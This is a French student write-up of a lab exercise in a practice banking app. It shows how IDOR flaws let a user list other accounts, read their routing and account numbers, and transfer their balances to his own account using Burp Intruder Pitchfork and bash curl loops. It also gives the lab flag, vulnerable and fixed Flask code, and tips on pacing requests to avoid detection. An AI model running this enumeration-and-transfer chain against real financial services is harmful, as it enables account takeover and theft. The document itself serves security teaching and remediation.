# WRITEUP - Task 2 : Wire Transfer IDOR avec Burp Suite Intruder

## 🎯 Objectif
Exploiter la vulnérabilité IDOR sur l'endpoint de transfert d'argent pour atteindre un solde de $10,000+ et récupérer le flag_2.

---

## 📋 Vue d'ensemble de l'attaque

**Principe :** Effectuer des transferts d'argent depuis les comptes d'autres utilisateurs vers notre propre compte en exploitant l'absence de validation d'ownership.

**Chaîne d'exploitation :**
```
1. Énumérer les account_id des victimes
2. Récupérer leurs credentials (routing, number, balance)
3. Initier des transferts frauduleux vers notre compte
4. Atteindre $10,000+ pour obtenir flag_2
```

---

## 🔍 PHASE 1 : Reconnaissance et collecte d'informations

### Étape 1.1 : Récupérer votre propre account_id

**Endpoint :** `GET /api/customer/info/me`

**Dans Burp Repeater :**
```http
GET /api/customer/info/me HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Réponse :**
```json
{
  "id": "8cb0fac7d4174ab9b983777098e6b61a",
  "username": "yosri",
  "accounts_id": [
    "4205e985b0a040dd8e9f97b16de2b3f3",  ← VOTRE ACCOUNT_ID (destination)
    "3eede4688a7a4f828f91e7c16a2b9710"
  ],
  "total_balance": 2194.7
}
```

**⚠️ Noter votre `account_id` de destination :**
```
MON_ACCOUNT_ID = 4205e985b0a040dd8e9f97b16de2b3f3
```

---

### Étape 1.2 : Énumérer les account_id des victimes

**Méthode 1 : Via les contacts**
```http
GET /api/customer/contacts HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Méthode 2 : Via les transactions**
```http
GET /api/customer/transactions HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Extraction des account_id :**
- Dans les contacts : `accounts_id[]` de chaque utilisateur
- Dans les transactions : `receiver_payment_id` et `sender_payment_id`

**Liste des 20 account_id victimes (exemple) :**
```
10f2416b9735441da5dfba2ea7f67f87
6e069c1640ae4d34b5ddb39219227d07
6235fb53768844569f34de12691841ac
3bd521f0f32f4b6dbdecabaf0ab424ec
9150364551264e5e9aa91f23afa6ac45
575cec7273a84ec083b079c12821b13f
c9e4e215668d4dd0890c7bd1da1542aa
2f5715147c9c48ad890d979481a57e6e
c640ad25c84543feb9a4a7dc6c7de7a2
f14899a124034ba29fa1cb6ded4c2db4
d80476ce166a440d8e1bf7839ba852a1
759a09337bdc4db6964e75d56c3a1f1f
639a9bb3137346d1a5de67c6f994b651
030abd8efa7a4cb3b0522e55c06dcb41
7087770b22bd48fc9fc0dd62c1f33c67
991d7640e2d14cc894b080a4f0908b3b
df085024fdd24d1f8093b18d20f6530f
2cea9ef9b46141ff9d4899c4b8c2098c
ba517ef4ae394b9ebfc1227502562e4f
b4eb32ac21e34edca774ed9210f4922e
```

---

### Étape 1.3 : Récupérer les credentials des comptes victimes

**Objectif :** Pour chaque `account_id`, récupérer : `routing`, `number`, `balance`

#### Configuration Burp Intruder - Phase 1

**1. Créer la requête dans Repeater :**
```http
GET /api/accounts/info/10f2416b9735441da5dfba2ea7f67f87 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**2. Send to Intruder**

**3. Positions :**
```http
GET /api/accounts/info/§ACCOUNT_ID§ HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**4. Attack type :** Sniper (une seule position)

**5. Payloads :** 
- Payload Set 1 : Liste des 20 account_id
- Payload type : Simple list
- Coller la liste des 20 IDs

**6. Options :**
- Request Engine → Threads : 1
- Request Engine → Delay : 500ms

**7. Start attack**

**8. Extraction des résultats :**

Pour chaque réponse, noter :
```json
{
  "message": {
    "id": "10f2416b9735441da5dfba2ea7f67f87",
    "routing": "106190002",
    "number": "107991601992",
    "balance": 113.5
  }
}
```

**9. Créer un CSV avec les données :**
```csv
account_id,routing,number,balance
10f2416b9735441da5dfba2ea7f67f87,106190002,107991601992,113.5
6e069c1640ae4d34b5ddb39219227d07,106190003,108234567890,456.2
...
```

**💡 Astuce automatisation :**
```bash
#!/bin/bash
SESSION="votre_session_cookie"
for id in $(cat account_ids.txt); do
    curl -s -H "Cookie: session=$SESSION" \
         "http://web0x06.hbtn/api/accounts/info/$id" \
         | jq -r ".message | \"$id,\(.routing),\(.number),\(.balance)\""
done > credentials.csv
```

---

## 💰 PHASE 2 : Exploitation - Transferts frauduleux

### Étape 2.1 : Capture d'une requête de transfert légitime

**1. Dans le navigateur (avec proxy Burp actif) :**
- Aller sur la page de transfert
- Effectuer UN transfert test (montant : 1)
- La requête apparaît dans Burp → Proxy → HTTP History

**2. Requête capturée :**
```http
POST /api/accounts/transfer_to/4205e985b0a040dd8e9f97b16de2b3f3 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
Content-Type: application/json

{
  "amount": 1,
  "raison": "test",
  "account_id": "10f2416b9735441da5dfba2ea7f67f87",
  "routing": "106190002",
  "number": "107991601992"
}
```

**3. Send to Intruder**

---

### Étape 2.2 : Configuration Burp Intruder - Phase 2

#### Positions

**1. Clear § (effacer les positions par défaut)**

**2. Sélectionner les 4 valeurs à remplacer :**
```http
POST /api/accounts/transfer_to/4205e985b0a040dd8e9f97b16de2b3f3 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
Content-Type: application/json

{
  "amount": §AMOUNT§,
  "raison": "transfert",
  "account_id": "§ACCOUNT_ID§",
  "routing": "§ROUTING§",
  "number": "§NUMBER§"
}
```

**3. Attack type :** Pitchfork
- Permet de synchroniser 4 listes de payloads en parallèle

---

#### Payloads

**Payload Set 1 : Amount**
- Type : Simple list
- Valeurs : `balance - 1` pour chaque compte (pour ne pas laisser le compte à zéro)
```
112
455
789
...
```

**Payload Set 2 : Account ID**
- Type : Simple list
- Valeurs : Les 20 account_id des victimes
```
10f2416b9735441da5dfba2ea7f67f87
6e069c1640ae4d34b5ddb39219227d07
...
```

**Payload Set 3 : Routing**
- Type : Simple list
- Valeurs : Les 20 routing numbers (dans le même ordre que les account_id)
```
106190002
106190003
...
```

**Payload Set 4 : Number**
- Type : Simple list
- Valeurs : Les 20 account numbers (dans le même ordre)
```
107991601992
108234567890
...
```

**⚠️ IMPORTANT :** Les 4 listes doivent être **synchronisées** (même ordre) !

---

#### Options

**Request Engine :**
- Number of threads : **1** (éviter le rate limiting)
- Delay between requests : **500 ms**

**Redirections :**
- Follow redirections : Always

**Grep - Extract (optionnel) :**
- Add → `"flag_2":`
- Pour extraire automatiquement le flag si présent

---

### Étape 2.3 : Lancer l'attaque

**1. Start attack**

**2. Observation en temps réel :**
- Fenêtre avec les résultats qui se remplissent
- Colonnes : Request #, Status, Length, Payload 1-4

**3. Résultats attendus :**
```
Status 200 : Transfert réussi
Status 403 : Non autorisé (rare si IDOR existe)
Status 400 : Erreur (compte vide, mauvaises credentials)
```

---

### Étape 2.4 : Analyse des résultats et récupération du flag

#### Méthode 1 : Filtrage dans Intruder

**1. Trier par Status Code**
- Cliquer sur la colonne "Status"
- Regarder uniquement les `200 OK`

**2. Regarder la colonne "Length"**
- Les réponses avec le flag sont légèrement plus longues

**3. Cliquer sur une ligne → Response → Raw**
```json
{
  "status": "success",
  "message": "Transfer completed successfully",
  "new_balance": 10234.5,
  "flag_2": "f8d657cfaa33318f86731fadc3d90689"
}
```

#### Méthode 2 : Vérification via API

**Après tous les transferts :**
```http
GET /api/customer/info/me HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Si balance > $10,000 :**
```json
{
  "username": "yosri",
  "total_balance": 10234.5,
  "flag_2": "f8d657cfaa33318f86731fadc3d90689"
}
```

#### Méthode 3 : Grep Extract automatique

Si configuré dans Intruder :
- Onglet "Results" → Colonne "flag_2"
- Le flag apparaît automatiquement dès qu'il est présent

---

## 📊 Résultat attendu

### Réponse de transfert standard
```json
{
  "status": "success",
  "message": "Transfer completed successfully",
  "new_balance": 1615.8
}
```

### Réponse avec le flag (après $10,000)
```json
{
  "status": "success",
  "message": "Transfer completed successfully",
  "new_balance": 10234.5,
  "flag_2": "f8d657cfaa33318f86731fadc3d90689"
}
```

---

## 🔐 Vulnérabilités exploitées

### IDOR-001 : Account Information Disclosure
- **Endpoint :** `/api/accounts/info/{account_id}`
- **Impact :** Accès aux credentials (routing, number, balance) de n'importe quel compte
- **Exploitation :** Énumération des 20 comptes victimes

### IDOR-002 : Unauthorized Wire Transfer
- **Endpoint :** `/api/accounts/transfer_to/{destination_account_id}`
- **Impact :** Transfert d'argent depuis n'importe quel compte sans validation d'ownership
- **Exploitation :** 20 transferts frauduleux vers notre compte

### Chaîne d'attaque complète
```
1. Énumération des account_id (via contacts/transactions)
2. IDOR sur /api/accounts/info/ → Récupération des credentials
3. IDOR sur /api/accounts/transfer_to/ → Transferts frauduleux
4. Accumulation de $10,000+ → flag_2 obtenu
```

---

## 🛡️ Recommandations de sécurité

### 1. Validation d'ownership stricte

**Code vulnérable :**
```python
@app.route('/api/accounts/transfer_to/<destination_id>', methods=['POST'])
@login_required
def transfer(destination_id):
    data = request.json
    source_account = get_account(data['account_id'])
    # ❌ Pas de vérification que l'utilisateur possède ce compte !
    transfer_money(source_account, destination_id, data['amount'])
    return {"status": "success"}
```

**Code sécurisé :**
```python
@app.route('/api/accounts/transfer_to/<destination_id>', methods=['POST'])
@login_required
def transfer(destination_id):
    current_user_id = session.get('user_id')
    data = request.json
    
    # ✅ Vérifier l'ownership du compte source
    source_account = get_account(data['account_id'])
    if source_account.owner_id != current_user_id:
        return {"error": "Unauthorized - You don't own this account"}, 403
    
    # ✅ Vérifier que les credentials correspondent
    if source_account.routing != data['routing'] or \
       source_account.number != data['number']:
        return {"error": "Invalid credentials"}, 400
    
    transfer_money(source_account, destination_id, data['amount'])
    return {"status": "success"}
```

### 2. Limiter l'accès aux informations de compte

**Code vulnérable :**
```python
@app.route('/api/accounts/info/<account_id>')
@login_required
def get_account_info(account_id):
    account = get_account(account_id)
    # ❌ Retourne toutes les infos sans vérification
    return jsonify(account)
```

**Code sécurisé :**
```python
@app.route('/api/accounts/info/<account_id>')
@login_required
def get_account_info(account_id):
    current_user_id = session.get('user_id')
    account = get_account(account_id)
    
    # ✅ Vérifier l'ownership
    if account.owner_id != current_user_id:
        return {"error": "Unauthorized"}, 403
    
    return jsonify({
        "id": account.id,
        "balance": account.balance,
        "number": mask_account_number(account.number),  # Masquer partiellement
        "routing": account.routing
    })
```

### 3. Audit et monitoring

```python
# Logger tous les accès suspects
@app.before_request
def log_access():
    if 'account_id' in request.args or 'account_id' in request.json:
        account_id = request.args.get('account_id') or request.json.get('account_id')
        current_user = get_current_user()
        account = get_account(account_id)
        
        # Si l'utilisateur accède à un compte qui n'est pas le sien
        if account and account.owner_id != current_user.id:
            log_security_event({
                "type": "IDOR_ATTEMPT",
                "user": current_user.id,
                "target_account": account_id,
                "endpoint": request.path,
                "ip": request.remote_addr
            })
```

### 4. Rate limiting

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/accounts/transfer_to/<destination_id>', methods=['POST'])
@limiter.limit("5 per minute")  # Maximum 5 transferts par minute
@login_required
def transfer(destination_id):
    # ...
```

---

## 📈 Comparaison des approches

### Burp Suite Intruder

**✅ Avantages :**
- Interface graphique intuitive
- Visualisation en temps réel des résultats
- Pas besoin de coder
- Filtering et sorting intégrés
- Grep Extract pour extraire automatiquement des valeurs
- Historique des attaques sauvegardé

**❌ Inconvénients :**
- Configuration en 2 phases (récup credentials puis transfert)
- Création manuelle du CSV de synchronisation
- Plus lent que Python (surtout version Community)
- Nécessite manipulation manuelle des résultats
- Pas d'automatisation complète

### Script Python

**✅ Avantages :**
- Automatisation complète en 1 script
- Plus rapide (parallélisation possible)
- Récupération automatique des credentials
- Sauvegarde automatique du flag
- Réutilisable facilement
- Pas de limitation de vitesse

**❌ Inconvénients :**
- Nécessite compétences en programmation
- Pas de visualisation graphique
- Debugging plus complexe
- Nécessite environnement Python configuré

---

## 💡 Tips & Tricks

### Automatisation de la Phase 1 (récupération credentials)

**Script Bash :**
```bash
#!/bin/bash
SESSION="votre_session_cookie"
OUTPUT="credentials.csv"

echo "account_id,routing,number,balance" > $OUTPUT

for id in $(cat account_ids.txt); do
    curl -s -H "Cookie: session=$SESSION" \
         "http://web0x06.hbtn/api/accounts/info/$id" \
         | jq -r ".message | \"$id,\(.routing),\(.number),\(.balance)\"" \
         >> $OUTPUT
done

echo "✅ Credentials saved to $OUTPUT"
```

### Import CSV dans Burp

**Option 1 : Copier-coller**
1. Ouvrir le CSV dans un éditeur
2. Copier la colonne souhaitée
3. Dans Burp Intruder → Payloads → Paste

**Option 2 : Load from file**
1. Burp Intruder → Payloads
2. Payload Options → Load
3. Sélectionner le fichier CSV

### Vérification rapide du solde

```bash
curl -s -H "Cookie: session=$SESSION" \
     http://web0x06.hbtn/api/customer/info/me \
     | jq '.total_balance'
```

---

## ⚠️ Points d'attention

### 1. Session expirée
**Symptôme :** Toutes les requêtes retournent 401 Unauthorized  
**Solution :** Récupérer un nouveau cookie de session
```
F12 → Application → Cookies → session=...
```

### 2. Rate limiting
**Symptôme :** Certaines requêtes retournent 429 Too Many Requests  
**Solution :** Augmenter le délai entre les requêtes (1000ms au lieu de 500ms)

### 3. Comptes vides
**Symptôme :** Tous les transferts échouent car balance = 0  
**Solution :** Restart le container Docker de l'application

### 4. Désynchronisation des payloads
**Symptôme :** Erreurs 400 Bad Request  
**Cause :** Les listes de payloads ne sont pas dans le même ordre  
**Solution :** Vérifier que account_id, routing, number sont alignés

### 5. Flag non trouvé
**Symptôme :** Tous les transferts réussis mais pas de flag  
**Cause :** Balance < $10,000  
**Solution :** Vérifier le solde total via `/api/customer/info/me`

---

## 🎓 Apprentissage

### Concepts clés démontrés

**1. IDOR sur action critique**
- Transfert d'argent sans vérification du propriétaire du compte source
- Impact financier direct

**2. Exploitation en chaîne**
- Énumération → Récupération credentials → Exploitation
- Chaque étape dépend de la précédente

**3. Burp Intruder - Attack type Pitchfork**
- Synchronisation de plusieurs listes de payloads
- Essentiel quand plusieurs paramètres doivent varier ensemble

**4. Rate limiting et détection**
- Importance de limiter la vitesse des requêtes
- Éviter la détection par les systèmes de monitoring

---

## 📝 Checklist de validation

- [ ] Mon account_id de destination noté
- [ ] 20 account_id victimes collectés
- [ ] Phase 1 Intruder : Credentials récupérés pour les 20 comptes
- [ ] CSV créé avec : account_id, routing, number, balance
- [ ] Phase 2 Intruder : 4 payload sets configurés (Pitchfork)
- [ ] Attack lancé et tous les transferts exécutés
- [ ] Balance finale > $10,000
- [ ] flag_2 récupéré
- [ ] Flag sauvegardé dans `2-flag.txt`

---

## 🏆 Validation finale

### Vérifier le flag
```bash
cat 2-flag.txt
# Doit contenir : f8d657cfaa33318f86731fadc3d90689 (ou votre flag)
```

### Commit Git
```bash
git add 2-flag.txt
git commit -m "Task 2: IDOR wire transfer exploitation complete - Burp Intruder method"
git push
```

---

## 📚 Ressources

- [PortSwigger - IDOR Tutorial](https://portswigger.net/web-security/access-control/idor)
- [Burp Intruder Documentation](https://portswigger.net/burp/documentation/desktop/tools/intruder)
- [Burp Pitchfork Attack Guide](https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types#pitchfork)
- [OWASP - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [OWASP Top 10 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

**Date :** 13 novembre 2025  
**Testeur :** Patrick (Cybersecurity Student - Holberton School)  
**Environnement :** http://web0x06.hbtn  
**Outil principal :** Burp Suite Community Edition  
**Méthode :** Burp Intruder avec Attack Type Pitchfork
